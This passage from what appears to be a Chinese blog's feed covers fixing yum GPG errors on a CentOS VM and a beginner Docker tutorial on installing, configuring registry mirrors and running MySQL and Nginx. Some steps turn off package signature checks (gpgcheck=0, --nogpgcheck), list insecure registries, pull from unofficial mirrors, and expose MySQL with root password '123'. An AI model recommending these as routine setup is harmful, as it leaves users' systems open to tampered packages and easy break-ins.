重新安装net-tools</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.54.45.png" alt="截屏2024-12-12 16.54.45"></p><blockquote><ul><li>问题解决方法：</li></ul><p>（方法1）</p><p>这个就是安装的时候会检查key。</p><p>在repo文件中关闭即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/yum.repos.d/epel.repo<span class="token punctuation">[</span>epel<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Extra Packages <span class="token keyword">for</span> Enterprise Linux <span class="token number">7</span> - <span class="token variable">$basearch</span><span class="token comment">#baseurl=http://download.fedoraproject.org/pub/epel/7/$basearch</span><span class="token assign-left variable">metalink</span><span class="token operator">=</span>https://mirrors.fedoraproject.org/metalink?repo<span class="token operator">=</span>epel-7<span class="token operator">&amp;</span><span class="token assign-left variable">arch</span><span class="token operator">=</span><span class="token variable">$basearch</span> <span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">pgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把gpgcheck=1  改为gpgcheck=0 即可，意思是在安装的时候不进行源的检查</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.58.38.png" style="zoom:40%;"><p>但是并没有这个文件。</p><p>尝试新建一个文件写入相关内容。</p><p>加入这个文件之后yum update都存在问题了。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.08.37.png" style="zoom:30%;"><p>….CentOS-7的密钥是存在的，为什么会检查CentOS-6，原因是之前配置yum源的gpgkey的配置。改成CentOS-7即可。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.09.53.png" style="zoom:50%;"><p>（方法2）</p><p># 在yum install 版本后面加上 –nogpgcheck，即可绕过GPG验证成功安装<br>　　yum install mysql-community-server –nogpgcheck</p><p>但这个方法不长久，每次都得多加参数。</p></blockquote><p>重新安装net-tools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.13.53.png" style="zoom:50%;"><p>成功之后执行ifconfig命令，成功执行。</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d">https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d</a> </p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机安装 </tag>
            
            <tag> centos安装 </tag>
            
            <tag> yum源配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门到进阶</title>
      <link href="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/"/>
      <url>/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Docker简介"><a href="#一、Docker简介" class="headerlink" title="一、Docker简介"></a>一、Docker简介</h1><p>Docker 是一种开源的容器化技术，能够将应用及其依赖打包进轻量级、可移植的容器中，实现快速部署和跨平台运行。</p><p>即：Docker是一个快速构建、运行、管理应用的工具。</p><h2 id="1-1-镜像和容器"><a href="#1-1-镜像和容器" class="headerlink" title="1.1 镜像和容器"></a>1.1 镜像和容器</h2><p>当我们利用Docker安装应用时，Docker会自动搜索并下载应用镜像（image）。镜像不仅包含应用本身，还包含应用运行所需要的环境、配置、系统函数库。Docker会在运行镜像时创建一个隔离环境，称为容器（container）。</p><p>镜像仓库：存储和管理镜像的平台，Docker官方维护了一个公共仓库：<a href="https://hub.docker.com/">Docker Hub</a>。</p><p>下图所示为docker、容器、镜像和镜像仓库的逻辑关系：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2009.49.19.png" style="zoom:50%;"><ul><li><p>容器（Container）是一种轻量级的、可执行的软件包，它将代码和环境打包在一起，确保应用在任何地方都能以相同的方式运行。容器是独立且隔离的，运行在宿主机上，共享操作系统内核，但与其他容器相互隔离。</p></li><li><p>镜像（Image）是容器运行的模板，包含了运行容器所需的代码、运行时、系统工具、系统库等。镜像是只读的，可以被多个容器实例共享，确保了环境的一致性。</p></li><li><p>仓库（Repository）是存放容器镜像的场所，可以是本地的也可以是远程的。常用的远程仓库包括 Docker Hub 和私有仓库。开发者将镜像推送到仓库中，其他用户可以从仓库中拉取镜像来创建和运行容器。</p></li></ul><blockquote><p>Docker是做什么的？</p><ul><li>Docker可以帮助我们下载应用镜像，创建并运行镜像的容器，从而快速部署应用。</li></ul><p>什么是镜像？</p><ul><li>将应用所需的函数库、依赖、配置等与应用一起打包得到的就是镜像。</li></ul><p>什么是容器?</p><ul><li>为每个镜像的应用进程创建的隔离运行环境就是容器。</li></ul><p>什么是镜像仓库?</p><ul><li>存储和管理镜像的服务就是镜像仓库，DockerHub是目前最大的镜像仓库，其中包含各种常见的应用镜像。</li></ul></blockquote><h1 id="二、Docker安装"><a href="#二、Docker安装" class="headerlink" title="二、Docker安装"></a>二、Docker安装</h1><h2 id="2-1-虚拟机系统准备"><a href="#2-1-虚拟机系统准备" class="headerlink" title="2.1 虚拟机系统准备"></a>2.1 虚拟机系统准备</h2><p>见【centos虚拟机安装及问题解决】一文。</p><p>我最后用的系统，centos7</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.19.27.png" style="zoom:50%;"><h2 id="2-2-卸载旧版Docker"><a href="#2-2-卸载旧版Docker" class="headerlink" title="2.2 卸载旧版Docker"></a>2.2 卸载旧版Docker</h2><p>首先如果系统中已经存在旧的Docker，则先卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span> <span class="token punctuation">\</span>    docker-client <span class="token punctuation">\</span>    docker-client-latest <span class="token punctuation">\</span>    docker-common <span class="token punctuation">\</span>    docker-latest <span class="token punctuation">\</span>    docker-latest-logrotate <span class="token punctuation">\</span>    docker-logrotate <span class="token punctuation">\</span>    docker-engine <span class="token punctuation">\</span>    docker-selinux <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.18.18.png" alt="截屏2024-12-12 17.18.18" style="zoom:35%;"><p>我的虚拟机上没有需要删除的docker相关的包。</p><h2 id="2-3-配置Docker的yum源"><a href="#2-3-配置Docker的yum源" class="headerlink" title="2.3 配置Docker的yum源"></a>2.3 配置Docker的yum源</h2><h3 id="2-3-1-yum工具包安装"><a href="#2-3-1-yum工具包安装" class="headerlink" title="2.3.1 yum工具包安装"></a>2.3.1 yum工具包安装</h3><p>首先要安装一个yum工具。</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.21.05.png" style="zoom:50%;"><h3 id="2-3-2-配置yum源"><a href="#2-3-2-配置yum源" class="headerlink" title="2.3.2 配置yum源"></a>2.3.2 配置yum源</h3><p>安装成功后，执行命令，配置Docker的yum源（已更新为阿里云源）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</span> /etc/yum.repos.d/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.21.54.png" alt="截屏2024-12-12 17.21.54"></p><blockquote><p>sudo sed -i ‘s+download.docker.com+mirrors.aliyun.com/docker-ce+’ /etc/yum.repos.d/docker-ce.repo</p><p>命令解释：</p><ol><li><code>sed</code>: 调用sed工具，它是一个流编辑器，用于对文本进行过滤和替换。</li><li><code>-i</code>: 选项告诉sed直接在文件中进行编辑，而不是输出到标准输出（即终端）。这会导致原文件被修改。</li><li><code>'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</code>: 这是一个sed的替换命令，它指示sed执行以下操作：<ul><li><code>s</code>: 表示替换（substitute）。</li><li><code>+</code>: 在sed中用作分隔符，这里它替代了默认的空格分隔符，因为默认的空格在URL中会出现，使用<code>+</code>可以避免这种情况。</li><li><code>download.docker.com</code>: 这是要被替换的字符串，即原始的Docker镜像源地址。</li><li><code>mirrors.aliyun.com/docker-ce</code>: 这是替换后的字符串，即阿里云的Docker镜像源地址。</li></ul></li><li><code>/etc/yum.repos.d/docker-ce.repo</code>: 指定了要编辑的文件路径。这个文件是Docker CE（社区版）的YUM仓库配置文件。</li></ol></blockquote><h3 id="2-3-3-更新yum，建立缓存"><a href="#2-3-3-更新yum，建立缓存" class="headerlink" title="2.3.3 更新yum，建立缓存"></a>2.3.3 更新yum，建立缓存</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.22.36.png" style="zoom:40%;"><h2 id="2-4-安装Docker"><a href="#2-4-安装Docker" class="headerlink" title="2.4 安装Docker"></a>2.4 安装Docker</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.27.07.png" style="zoom:50%;"><h2 id="2-5-启动和校验安装是否成功"><a href="#2-5-启动和校验安装是否成功" class="headerlink" title="2.5 启动和校验安装是否成功"></a>2.5 启动和校验安装是否成功</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看docker状态</span>systemctl status <span class="token function">docker</span><span class="token comment"># 启动Docker</span>systemctl start <span class="token function">docker</span><span class="token comment"># 停止Docker</span>systemctl stop <span class="token function">docker</span><span class="token comment"># 重启</span>systemctl restart <span class="token function">docker</span><span class="token comment"># 设置开机自启</span>systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span class="token comment"># 执行docker ps命令，如果不报错，说明安装启动成功</span><span class="token function">docker</span> <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.29.23.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.30.03.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.32.21.png" alt="截屏2024-12-12 17.32.21" style="zoom:40%;"><h2 id="2-6-配置镜像加速"><a href="#2-6-配置镜像加速" class="headerlink" title="2.6 配置镜像加速"></a>2.6 配置镜像加速</h2><p>阿里云docker镜像加速：</p><p><a href="https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images">https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images</a></p><h3 id="2-6-1-获取镜像加速器地址"><a href="#2-6-1-获取镜像加速器地址" class="headerlink" title="2.6.1 获取镜像加速器地址"></a>2.6.1 获取镜像加速器地址</h3><ol><li>登录<a href="https://cr.console.aliyun.com/?spm=a2c4g.11186623.0.0.27881d82aiM6LW">容器镜像服务控制台</a>。</li><li>在左侧导航栏选择<em><strong>*镜像工具** &gt; **镜像加速器*</strong></em></li><li>在<strong>镜像加速器</strong>页面获取<strong>加速器地址</strong>。</li></ol><h3 id="2-6-2-配置镜像加速器"><a href="#2-6-2-配置镜像加速器" class="headerlink" title="2.6.2 配置镜像加速器"></a>2.6.2 配置镜像加速器</h3><p>Docker和Containerd的镜像加速器配置方法有所不同。您可以根据具体情况选择合适的配置方式。</p><p>可以先使用<code>docker --version</code>查看Docker的版本，然后根据实际情况选择不同的配置方式。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.42.13.png" style="zoom:50%;"><h3 id="新版本Docker（1-10及以上）"><a href="#新版本Docker（1-10及以上）" class="headerlink" title="新版本Docker（1.10及以上）"></a><strong>新版本Docker（1.10及以上）</strong></h3><p>创建并编辑<code>/etc/docker/daemon.json</code>文件（如果文件不存在，则创建）：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;镜像加速器地址&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /etc/docker<span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;-</span><span class="token string">'EOF'{  "registry-mirrors": ["https://xxxxxxxx.aliyuncs.com"]}EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后重启Docker Daemon。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="三、Docker快速入门（一键部署mysql）"><a href="#三、Docker快速入门（一键部署mysql）" class="headerlink" title="三、Docker快速入门（一键部署mysql）"></a>三、Docker快速入门（一键部署mysql）</h1><h2 id="3-1-一键部署mysql"><a href="#3-1-一键部署mysql" class="headerlink" title="3.1 一键部署mysql"></a>3.1 一键部署mysql</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> ms <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span> mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令解读：</p><p><strong>docker run</strong> ：创建并运行一个容器，**-d** 是让容器在后台运行</p><p><strong>–name mysql</strong> ：给容器起个名字，必须唯一</p><p><strong>-p 3306:3306</strong> ：设置端口映射 ，&lt;宿主机端口&gt;:&lt;容器端口&gt;</p><p><strong>-e KEY=VALUE</strong> ：是设置环境变量</p><p><strong>mysql</strong> ：指定运行的镜像的名字</p></blockquote><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.51.05.png" style="zoom:50%;"><h2 id="3-2-镜像加速问题解决"><a href="#3-2-镜像加速问题解决" class="headerlink" title="3.2 镜像加速问题解决"></a>3.2 镜像加速问题解决</h2><blockquote><p>问题解决：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.53.02.png" alt="截屏2024-12-12 17.53.02"></p><p>网上有很多原因解释，一是说因为没有配置镜像加速，可是刚在前面配置过，并且也重启了docker。</p><p>尝试更换为如下的地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"registry-mirrors"</span>:<span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还是不行。</p><p>继续鼓捣这个daemon.json</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span> <span class="token string">"registry-mirrors"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>   <span class="token string">"https://mirror.ccs.tencentyun.com"</span>,   <span class="token string">"http://registry.docker-cn.com"</span>,   <span class="token string">"http://docker.mirrors.ustc.edu.cn"</span>,   <span class="token string">"http://hub-mirror.c.163.com"</span> <span class="token punctuation">]</span>, <span class="token string">"insecure-registries"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>   <span class="token string">"registry.docker-cn.com"</span>,   <span class="token string">"docker.mirrors.ustc.edu.cn"</span> <span class="token punctuation">]</span>, <span class="token string">"debug"</span> <span class="token builtin class-name">:</span> true, <span class="token string">"experimental"</span> <span class="token builtin class-name">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn/"</span>,<span class="token string">"https://hub-mirror.c.163.com"</span>,<span class="token string">"https://registry.docker-cn.com"</span><span class="token punctuation">]</span>,<span class="token string">"insecure-registries"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"10.0.0.12:5000"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还是不行。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.02.59.png" style="zoom:50%;"><p>发现是域名解析的问题，然后尝试追加网卡配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/sysconfig/network-scripts/ifcfg-ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.05.00.png" style="zoom:40%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.09.10.png" style="zoom:50%;"><p>还是无法ping通。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.06.14.png" alt="截屏2024-12-12 18.06.14" style="zoom:50%;"><ul><li>使用dig获取ip</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> bind-utils<span class="token function">dig</span> @114.114.114.114 registry-1.docker.io<span class="token function">dig</span> @8.8.8.8 registry-1.docker.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.14.08.png" alt="截屏2024-12-12 18.14.08"></p><p>dig到的ip208.43.170.231…ping不通。</p><p>docker info查看信息，镜像仓库已经配置成功，网页访问一下各个地址，发现都访问不了。</p><p>最终通过不断尝试和查找资料找到一种可行的方法，直接在镜像名前面加可用的仓库地址（这个需要不断搜集更新，时不时就有可能被墙）。</p><p>最终解决：</p><p>1）收集仓库地址，http访问测试连通性并配置。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.14.38.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://docker.1panel.dev/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.1panel.dev"]}EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2）拉取镜像的时候添加路径</p><p>按照上面的过程操作之后，还是会报错。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.15.17.png" alt="截屏2024-12-13 09.15.17"></p><p>这时候添加路径进行尝试。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.17.23.png" alt="截屏2024-12-13 09.17.23" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.18.00.png" alt="截屏2024-12-13 09.18.00" style="zoom:50%;"><p>说明还是挂掉了。那么就需要继续找新的能用的镜像仓库。</p><p><a href="https://www.cnblogs.com/Nine4Cool/p/18499621">https://www.cnblogs.com/Nine4Cool/p/18499621</a></p><p><a href="https://blog.csdn.net/llc580231/article/details/139979603">https://blog.csdn.net/llc580231/article/details/139979603</a></p><p>最后下面一些可用的镜像仓库地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://docker.m.daocloud.iohttps://docker.zhai.cm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.46.59.png" alt="截屏2024-12-13 09.46.59" style="zoom:50%;"><p>注意：单次指定从某个仓库拉取镜像，指定<code>域名/library/mysql</code>。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.42.02.png" alt="截屏2024-12-13 09.42.02"></p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.44.59.png" alt="截屏2024-12-13 09.44.59"></p><p>仍然会拉取失败。。。。。。。</p><p>用<a href="https://docker.zhai.cm/">https://docker.zhai.cm</a> 拉取成功。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.49.46.png" alt="截屏2024-12-13 09.49.46"></p><p>所以进行配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.zhai.cm"]}EOF</span>systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再尝试拉取一下nginx镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.55.08.png" alt="截屏2024-12-13 09.55.08" style="zoom:50%;"><p>成功拉取得。</p><p>所以核心中的核心就是拿到流畅可用的镜像仓库地址。</p></blockquote><h2 id="3-3-访问测试"><a href="#3-3-访问测试" class="headerlink" title="3.3 访问测试"></a>3.3 访问测试</h2><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.24.57.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.23.39.png" style="zoom:40%;"><h1 id="四、Docker命令基础"><a href="#四、Docker命令基础" class="headerlink" title="四、Docker命令基础"></a>四、Docker命令基础</h1><h2 id="4-1-镜像命名规范"><a href="#4-1-镜像命名规范" class="headerlink" title="4.1 镜像命名规范"></a>4.1 镜像命名规范</h2><p>镜像名称一般分两部分组成：[repository]:[tag]。</p><ul><li><p>其中repository就是镜像名</p></li><li><p>tag是镜像的版本</p></li></ul><p>在没有指定tag时，默认是latest，代表最新版本的镜像。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.28.36.png" style="zoom:40%;"><h2 id="4-2-命令概述"><a href="#4-2-命令概述" class="headerlink" title="4.2 命令概述"></a>4.2 命令概述</h2><p>Docker最常见的命令就是操作镜像、容器的命令，详见官方文档：<a href="https://docs.docker.com/"> https://docs.docker.com/</a></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.30.50.png" alt="docker命令概览" style="zoom:50%;"><h2 id="4-3-案例练习"><a href="#4-3-案例练习" class="headerlink" title="4.3 案例练习"></a>4.3 案例练习</h2><p>在DockerHub中搜索Nginx镜像，查看镜像的名称</p><ul><li><p>拉取Nginx镜像：docker pull 镜像名</p></li><li><p>查看本地镜像列表：docker images</p></li><li><p>创建并运行Nginx容器：docker run -d </p></li><li><p>查看容器： docker images</p></li><li><p>停止容器：docker stop</p></li><li><p>再次启动容器：docker start</p></li><li><p>进入Nginx容器：docker exec -it</p></li><li><p>删除容器：docker rm</p></li></ul><h2 id="4-4-命令别名"><a href="#4-4-命令别名" class="headerlink" title="4.4 命令别名"></a>4.4 命令别名</h2><p>docker ps的输出可读性较差，如下图所示：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.20.30.png" alt="截屏2024-12-13 13.20.30"></p><p>为了简化docker ps命令的输出，通常会用如下的命令来查看容器信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">--format</span> <span class="token string">"table {{.ID}}<span class="token entity" title="\t">\t</span> {{.Image}}<span class="token entity" title="\t">\t</span>{{.Ports}}<span class="token entity" title="\t">\t</span>{{.Status}}<span class="token entity" title="\t">\t</span>{{.Names}}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令冗长不便于记忆，可以在～/.bashrc中命名一个别名。编辑～/.bashrc，添加如下内容（顺便把docker images也简化了）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ～/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.22.01.png" alt="截屏2024-12-13 13.22.01"></p><p>-a 参数是为了显示那些停止运行但没有被删除的容器。</p><p>保存退出之后，执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ～/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.19.39.png" alt="截屏2024-12-13 13.19.39"></p><h1 id="五、数据卷"><a href="#五、数据卷" class="headerlink" title="五、数据卷"></a>五、数据卷</h1><h2 id="5-1-数据卷"><a href="#5-1-数据卷" class="headerlink" title="5.1 数据卷"></a>5.1 数据卷</h2><p>数据卷（volume）是一个虚拟目录，是容器内目录与宿主机目录之间映射的桥梁。</p><img 